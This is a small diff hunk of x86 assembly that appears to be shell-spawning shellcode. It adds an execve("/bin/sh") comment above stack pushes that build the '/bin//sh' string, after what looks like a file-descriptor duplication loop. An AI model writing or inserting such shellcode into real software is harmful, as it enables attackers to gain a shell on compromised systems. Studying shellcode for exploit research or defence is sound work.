@@ -50,8 +50,8 @@ loop:
 	cmp ecx,0x2
 	jle loop
 
-
-xor eax, eax
+;    execve("/bin/sh", 0, 0);
+	xor eax, eax
 	push eax
 	push 0x68732f2f
 	push 0x6e69622f
